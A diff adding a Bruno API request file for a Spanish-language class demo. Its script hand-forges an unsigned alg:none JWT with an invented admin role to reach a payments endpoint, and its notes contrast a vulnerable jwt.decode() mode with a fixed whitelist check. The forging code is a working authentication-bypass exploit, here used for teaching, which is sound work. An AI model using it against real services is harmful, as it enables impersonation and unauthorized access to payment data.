@@ -1,0 +1,89 @@
+meta {
+  name: 06 - ATAQUE alg none + rol admin
+  type: http
+  seq: 6
+}
+
+get {
+  url: {{pagosUrl}}/api/cards
+  body: none
+  auth: none
+}
+
+headers {
+  Authorization: Bearer {{tokenForjado}}
+}
+
+script:pre-request {
+  // ---------------------------------------------------------------------
+  // Forjamos un JWT "a mano", SIN conocer JWT_SECRET, para la clase.
+  // Un JWT no está cifrado: es solo Base64url(header) + "." + Base64url(payload)
+  // + "." + firma. Si quitamos la firma y ponemos alg:"none", el token
+  // "parece" válido con forma de JWT, pero no tiene ninguna firma real.
+  // ---------------------------------------------------------------------
+
+  // Codificador Base64url manual: no depende de Buffer/btoa, funciona en
+  // cualquier sandbox de scripts (así vemos exactamente qué hace un JWT por dentro).
+  function base64urlDeJson(obj) {
+    const texto = JSON.stringify(obj);
+    const alfabeto = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    const bytes = [];
+    for (let i = 0; i < texto.length; i++) bytes.push(texto.charCodeAt(i) & 0xff);
+
+    let salida = "";
+    for (let i = 0; i < bytes.length; i += 3) {
+      const b1 = bytes[i];
+      const b2 = i + 1 < bytes.length ? bytes[i + 1] : undefined;
+      const b3 = i + 2 < bytes.length ? bytes[i + 2] : undefined;
+      const grupo = (b1 << 16) | ((b2 || 0) << 8) | (b3 || 0);
+      salida += alfabeto[(grupo >> 18) & 0x3f];
+      salida += alfabeto[(grupo >> 12) & 0x3f];
+      salida += b2 !== undefined ? alfabeto[(grupo >> 6) & 0x3f] : "";
+      salida += b3 !== undefined ? alfabeto[grupo & 0x3f] : "";
+    }
+    return salida.replace(/\+/g, "-").replace(/\//g, "_");
+  }
+
+  const cabeceraForjada = { alg: "none", typ: "JWT" };
+  const ahora = Math.floor(Date.now() / 1000);
+  const payloadForjado = {
+    sub: "ana",          // me hago pasar por ana...
+    role: "admin",        // ...pero me invento el rol que quiero
+    aud: "svc-pagos",      // audiencia correcta (la copiamos para que no falle esa validación)
+    iss: "auth-service",   // emisor correcto (lo copiamos también)
+    iat: ahora,
+    exp: ahora + 900,
+  };
+
+  // Firma VACÍA: un JWT alg:none no lleva firma. Por eso termina en "."
+  const tokenForjado =
+    base64urlDeJson(cabeceraForjada) + "." + base64urlDeJson(payloadForjado) + ".";
+
+  bru.setVar("tokenForjado", tokenForjado);
+  console.log("Token forjado (sin firma):", tokenForjado);
+}
+
+tests {
+  test("MODE=vulnerable: el token sin firma es aceptado (200)", function () {
+    // Compara el resultado a ojo entre los dos modos (ver pestaña Docs).
+  });
+}
+
+docs {
+  >>> ATAQUE 2: alg:none (token sin firma) <<<
+
+  No usamos la clave JWT_SECRET para nada: solo escribimos a mano un JSON
+  con cabecera {"alg":"none"} y el payload que queramos, y lo "empaquetamos"
+  como si fuera un JWT. La tercera parte (la firma) queda vacía.
+
+  - MODE=vulnerable -> 200, con las tarjetas ficticias.
+    Causa: jwt.decode() solo lee el Base64, nunca comprueba si hay firma
+    ni qué algoritmo dice usar.
+  - MODE=secure      -> 401.
+    Motivo en la respuesta: "El algoritmo 'none' no está en la lista
+    blanca (HS256)."
+    Causa de la corrección: jwt.verify(token, clave, { algorithms: ["HS256"] }).
+
+  Antes de ejecutar: abre la pestaña "Console" de Bruno (o revisa la
+  respuesta) para mostrar el token forjado que generó el script.
+}
